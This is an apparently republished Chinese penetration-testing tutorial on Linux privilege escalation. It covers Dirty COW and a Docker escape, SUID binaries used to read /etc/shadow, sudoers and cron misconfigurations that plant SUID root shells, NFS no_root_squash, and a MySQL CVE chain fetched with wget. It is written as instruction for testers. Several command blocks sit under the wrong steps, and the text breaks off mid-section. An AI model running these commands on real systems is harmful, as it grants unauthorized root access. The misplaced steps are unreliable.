> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448906593&idx=1&sn=6345baa99eaaebab481a05f71685128c&chksm=8b55c93cbc22402a2b698656c1deedf88738e3a27e47aa7dcf987a941a82d2a9c1522651cf16&mpshare=1&scene=1&srcid=0104lpty31Xs7aWYBfWwNPjt&sharer_sharetime=1609720573259&sharer_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=3c9189d1b71985a50fed8abcee5379f7ab59c2a1b0289985f0d001c54e3323c7c7fb55e4eb380616ffcdfc13ccd995d34de4f617b936fc73f68d3a7251e629a773e443e8072447f0eb86353cab9b1f76c2f90a1916e8b9cb22695eac46c24ed952b367dbb222d1dcad34d65d8905650b5914733c01f5bff64dae19438e79e70a&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=63010029&lang=zh_CN&exportkey=AbKiI0Uz1ApPR9dZcZNIeE4%3D&pass_ticket=yy556pu%2Bp4W4mbvK7Q3O6PIbolc7ebdCh%2F3poyqaL0RGTca9FUoYwlT9SUXPGlGT&wx_header=0&fontgear=2)

在渗透测试过程中，提升权限是非常关键的一步，攻击者往往可以通过利用内核漏洞 / 权限配置不当 / root 权限运行的服务等方式寻找突破点，来达到提升权限的目的。

**1、内核漏洞提权**

提起内核漏洞提权就不得不提到脏牛漏洞（Dirty Cow），是存在时间最长且影响范围最广的漏洞之一。低权限用户可以利用该漏洞实现本地提权，同时可以通过该漏洞实现 Docker 容器逃逸，获得 root 权限的 shell。

**1.1 本地内核提权**

（1）检测内核版本

```
# 查看系统发行版本
lsb_release -a
# 查看内核版本
uname -a
```

(2) 下载，编译生成 exp 文件

```
bypass@ubuntu:~$ make
```

（3）执行成功，返回一个 root 权限的 shell。

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nrDf4CnLaaKjsjm6TDibALFsaeuKumWVDMNm8Enicva4V2ecQew1Z001ibWDicqTwZgkyowWqtnQ061w/640?wx_fmt=png)

**1.2 利用 DirtyCow 漏洞实现 Docker 逃逸**

（1）进入容器，编译 POC 并执行：

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nrDf4CnLaaKjsjm6TDibALF58sMyib2SRGOVetT11nyQq7S5A2KlaOcacozIic4zOtSgjEQkvxiaWqeg/640?wx_fmt=png)

（2）在攻击者机器上，成功接收到宿主机反弹的 shell。

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nrDf4CnLaaKjsjm6TDibALF8qxyTZricJPuziacvwVWr6aiawSibrm5tcaXeUYT4IVAkAD6dHia4NdhWdg/640?wx_fmt=png)

**1.3 Linux 提权辅助工具**

github 项目地址：

```
https://github.com/mzet-/linux-exploit-suggester.git
```

（1）根据操作系统版本号自动查找相应提权脚本

```
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nrDf4CnLaaKjsjm6TDibALF1ic0UKhKEhx670FDiaPDzNvzrPViadyTNzia6eP1ykyBPHdMx8A0qk00rA/640?wx_fmt=png)

（2）根据提示下载 poc，编译执行。

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nrDf4CnLaaKjsjm6TDibALFAyvhGKOLAnjUGFNbrUw5adTh1HHV6kv4ibwHpPWusOBaBjJ2BM0Bvmw/640?wx_fmt=png)

**2、利用 SUID 提权**

SUID 是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行 root 用户所拥有的 SUID 的文件，那么就可以在运行该文件的时候获得 root 用户权限。

（1）在 Linux 中查找可以用来提权的 SUID 文件

```
find / -perm -u=s -type f 2>/dev/null
```

（2）通过 find 以 root 权限执行命令

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nrDf4CnLaaKjsjm6TDibALFuicEtSF2bia0pOtgVicTq486CKffoenIguJ3wakX63M5mdGicYoaxD0uUg/640?wx_fmt=png)

可用作 Linux 提权的命令及其姿势:

```
#Find
find pentestlab -exec whoami \;
#Vim
vim.tiny /etc/shadow
#awk
awk 'BEGIN{system("whoami")}'
#curl
curl file:///etc/shadow
#Bash
bash -p  
#Less
less /etc/passwd
#Nmap
nmap --interactive
```

**3、SUDO 提权**

普通用户在使用 sudo 执行命令的过程中，会以 root 方式执行命令。在很多场景里，管理员为了运维管理方便，sudoer 配置文件错误导致提权。

（1）设置 sudo 免密码

```
$vi /etc/sudoers
在最后一行添加：bypass ALL=(ALL:ALL) NOPASSWD:ALL
```

（2）查看 sudo 的权限

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nrDf4CnLaaKjsjm6TDibALFPv7mfxwlM14QIdlFDFcY55OTntWwLZlfjQb8V9JB1KITE2AKClgP5w/640?wx_fmt=png)

**4、计划任务**

如果可以找到可以有权限修改的计划任务脚本，就可以修改脚本实现提权。本质上，就是文件权限配置不当。

（1）查看计划任务，找到有修改权限的计划任务脚本。

```
ls -l /etc/cron*
more /etc/crontab
```

```
cp /bin/bash /tmp/shell
chmod u+s /tmp/shell
```

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nrDf4CnLaaKjsjm6TDibALFjge4yK2N9zQzrrB52xwld2XVhsHBZb057Syt8ibT9585YXg85GCaHLg/640?wx_fmt=png)

（2）在 mysqlback.sh 添加 SUID shell 后门，当定时任务以 root 再次执行的时候，可以获取 root 权限。  

```
sudo showmount -e 10.1.1.233
```

**5、NFS 提权**

当服务器中存在 NFS 共享，开启 no_root_squash 选项时，如果客户端使用的是 root 用户，那么对于共享目录来说，该客户端就有 root 权限，可以使用它来提升权限。

（1）查看 NFS 服务器上的共享目录

```
sudo mkdir -p /tmp/data
sudo mount -t nfs 10.1.1.233:/home/bypass /tmp/data
cp /bin/bash /tmp/data/shell
chmod u+s /tmp/data/shell
```

（2）创建本地挂载目录，挂载共享目录。使用攻击者本地 root 权限创建 Suid shell。

```
cd /var/www/html/
gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient
./mysql-privesc-race test 123456 localhost testdb
```

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nrDf4CnLaaKjsjm6TDibALFpGIlpOaOpy7j2fth0VabicibyFA8r9OsGsA2ZuItfmcjvm3rsvugEUWg/640?wx_fmt=png)

（3）回到要提权的服务器上，使用普通用户使用 - p 参数来获取 root 权限。

![](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4nrDf4CnLaaKjsjm6TDibALFfVG7claRvJKuKu0OH6hicIKw2V0ribPEUSNtXuY2HLedoILcg5KZdvbw/640?wx_fmt=png)

**6、MySQL 提权**

MySQL 提权方式有 UDF 提权，MOF 提权，写入启动项提权等方式，但比较有意思的是 CVE-2016-6663、CVE-2016-6664 组合利用的提取场景，可以将一个 www-data 权限提升到 root 权限。

（1）利用 CVE-2016-6663 将 www-data 权限提升为 mysql 权限：

```
wget http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh
chmod 777 mysql-chowned.sh
./mysql-chowned.sh /var/log/mysql/error.log
```

（2）利用 CVE-2016-6664 将 Mysql 权限提升为 root 权限：